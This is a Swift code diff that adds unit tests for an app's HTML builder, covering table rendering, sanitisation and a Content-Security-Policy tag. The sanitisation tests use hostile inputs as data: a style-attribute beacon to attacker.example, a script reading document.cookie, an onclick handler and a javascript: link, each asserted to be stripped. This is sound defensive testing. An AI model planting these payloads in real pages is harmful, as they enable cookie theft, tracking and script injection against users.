@@ -409,7 +409,7 @@ private struct EmptyFetchSourcesUseCase: FetchSourcesUseCaseProtocol {
 }
 
 private struct EmptyUpdateSourceUseCase: UpdateSourceUseCaseProtocol {
-    func execute(id: String, title: String, author: String) async throws -> Source { throw CancellationError() }
+    func execute(id: String, title: String, author: String, content: String?) async throws -> Source { throw CancellationError() }
 }
 
 private struct EmptyFetchSourceDetailUseCase: FetchSourceDetailUseCaseProtocol {
@@ -433,3 +433,122 @@ private struct EmptyFetchNotebookUseCase: FetchNotebookUseCaseProtocol {
 private struct EmptySaveNotebookUseCase: SaveNotebookUseCaseProtocol {
     func execute(entry: NotebookEntry) async throws {}
 }
+
+final class SourceHTMLBuilderTests: XCTestCase {
+    func testMarkdownTableHTMLBuilding() {
+        let markdownContent = """
+        Sheet1
+
+        | First Name | Last Name | Gender | Country |
+        |---|---|---|---|
+        | Dulce | Abril | Female | United States |
+        | Mara | Hashimoto | Female | Great Britain |
+        """
+
+        let source = Source(
+            id: "test",
+            researchSpaceId: "space",
+            sourceType: .file,
+            title: "Test Table",
+            author: "",
+            sourceUrl: "",
+            fileName: "test.xlsx",
+            fileSize: 100,
+            fileType: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
+            pageCount: 1,
+            characterCount: 100,
+            content: markdownContent,
+            structuredContent: nil,
+            processingState: .ready,
+            processingError: "",
+            createdAt: Date(),
+            updatedAt: Date()
+        )
+
+        let html = SourceHTMLBuilder.fullHTML(for: source)
+
+        XCTAssertTrue(html.contains("<table"))
+        XCTAssertTrue(html.contains("<th>First Name</th>"))
+        XCTAssertTrue(html.contains("<td>Dulce</td>"))
+        XCTAssertTrue(html.contains("class=\"table-wrap\""))
+    }
+
+    private func makeSource(html: String) -> Source {
+        Source(
+            id: "test",
+            researchSpaceId: "space",
+            sourceType: .file,
+            title: "Test",
+            author: "",
+            sourceUrl: "",
+            fileName: "test.html",
+            fileSize: 100,
+            fileType: "text/html",
+            pageCount: 1,
+            characterCount: 100,
+            content: "",
+            structuredContent: SourceStructuredContent(html: html, type: "document"),
+            processingState: .ready,
+            processingError: "",
+            createdAt: Date(),
+            updatedAt: Date()
+        )
+    }
+
+    func testSanitizeStripsStyleAttribute() {
+        let html = "<p style=\"background:url(https://attacker.example/beacon?doc=42)\">hello</p>"
+        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
+        XCTAssertFalse(result.contains("style="), "style attribute should be stripped")
+        XCTAssertFalse(result.contains("attacker.example"), "external URL in style should not survive")
+        XCTAssertTrue(result.contains("hello"), "text content should be preserved")
+    }
+
+    func testSanitizeStripsEventHandlers() {
+        let html = "<p onclick=\"alert('xss')\">click me</p>"
+        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
+        XCTAssertFalse(result.contains("onclick"))
+        XCTAssertTrue(result.contains("click me"))
+    }
+
+    func testSanitizeStripsScriptTag() {
+        let html = "<script>document.cookie</script><p>safe</p>"
+        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
+        XCTAssertFalse(result.contains("<script>"))
+        XCTAssertTrue(result.contains("safe"))
+    }
+
+    func testSanitizeStripsJavascriptURIs() {
+        let html = "<a href=\"javascript:alert(1)\">link</a>"
+        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
+        XCTAssertFalse(result.contains("javascript:"))
+        XCTAssertTrue(result.contains("link"))
+    }
+
+    func testSanitizePreservesClassAndId() {
+        let html = "<p class=\"highlight\" id=\"intro\">text</p>"
+        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
+        XCTAssertTrue(result.contains("class=\"highlight\""))
+        XCTAssertTrue(result.contains("id=\"intro\""))
+    }
+
+    func testSanitizePreservesAllowedHref() {
+        let html = "<a href=\"https://example.com\">link</a>"
+        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
+        XCTAssertTrue(result.contains("href=\"https://example.com\""))
+    }
+
+    func testTableWrapAppliedToAllUnwrappedTables() {
+        let html = "<div><table><tr><td>a</td></tr></table><table><tr><td>b</td></tr></table></div>"
+        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
+        let wraps = result.components(separatedBy: "class=\"table-wrap\"").count - 1
+        XCTAssertEqual(wraps, 2, "both tables should be wrapped individually")
+    }
+
+    func testCSPMetaTagPresent() {
+        let html = "<p>hello</p>"
+        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
+        XCTAssertTrue(result.contains("Content-Security-Policy"), "CSP meta tag should be present")
+        XCTAssertTrue(result.contains("default-src 'none'"), "CSP should block all default sources")
+    }
+}
+
